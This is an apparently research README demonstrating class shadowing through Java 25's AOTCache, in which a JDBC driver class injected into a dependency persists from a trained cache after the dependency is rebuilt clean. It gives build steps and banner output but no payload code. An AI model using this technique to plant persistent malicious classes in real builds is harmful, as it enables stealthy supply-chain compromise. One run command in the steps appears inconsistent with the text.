### Shadowing class in AOTCache

I used Java 25 for this experiment.
```
openjdk version "25" 2025-09-16
OpenJDK Runtime Environment (build 25+36-3489)
OpenJDK 64-Bit Server VM (build 25+36-3489, mixed mode, sharing)
```
Also make sure you have postgres running on localhost:5432 because the victim application connects to
`jdbc:postgresql://localhost:5432/postgres?user=postgres&password=12345678`.

### Inject a class in dependency

```shell
cd install-me-first
mvn clean install -Pinject
```

### Build the victim application

```
cd victim
mvn clean package
```

You should see the following output:
```shell
$ java -jar target/victim-1.0.jar
88                                88                           88  
88                                88                           88  
88                                88                           88  
88,dPPYba,  ,adPPYYba,  ,adPPYba, 88   ,d8  ,adPPYba,  ,adPPYb,88  
88P'    "8a ""     `Y8 a8"     "" 88 ,a8"  a8P_____88 a8"    `Y88  
88       88 ,adPPPPP88 8b         8888[    8PP""""""" 8b       88  
88       88 88,    ,88 "8a,   ,aa 88`"Yba, "8b,   ,aa "8a,   ,d88  
88       88 `"8bbdP"Y8  `"Ybbd8"' 88   `Y8a `"Ybbd8"'  `"8bbdP"Y8  

Connection is valid!
Connected to port 5432 with user postgres
```
Now train the AOTCache with the victim application.
```shell
java -XX:AOTCacheOutput=maven.aot -jar target/victim-1.0.jar
```

### Build dependencies again without injecting the class

```shell
cd install-me-first
mvn clean install
```

### Build the victim application again

```shell
cd victim
mvn clean package
```

You should see the following output when running the victim application without AOTCache:
```shell
$ java -jar target/victim-1.0.jar
Connection is valid!
Connected to port 5432 with user postgres
```

However, when running the victim application with AOTCache, you should see the following output:
```shell
$ java -XX:AOTCacheOutput=maven.aot -jar target/victim-1.0.jar
88                                88                           88  
88                                88                           88  
88                                88                           88  
88,dPPYba,  ,adPPYYba,  ,adPPYba, 88   ,d8  ,adPPYba,  ,adPPYb,88  
88P'    "8a ""     `Y8 a8"     "" 88 ,a8"  a8P_____88 a8"    `Y88  
88       88 ,adPPPPP88 8b         8888[    8PP""""""" 8b       88  
88       88 88,    ,88 "8a,   ,aa 88`"Yba, "8b,   ,aa "8a,   ,d88  
88       88 `"8bbdP"Y8  `"Ybbd8"' 88   `Y8a `"Ybbd8"'  `"8bbdP"Y8  

Connection is valid!
Connected to port 5432 with user postgres
```

This means that JVM has initialized the class `org.postgresql.Driver` from the AOTCache which was trained with the malicious version of the dependency.
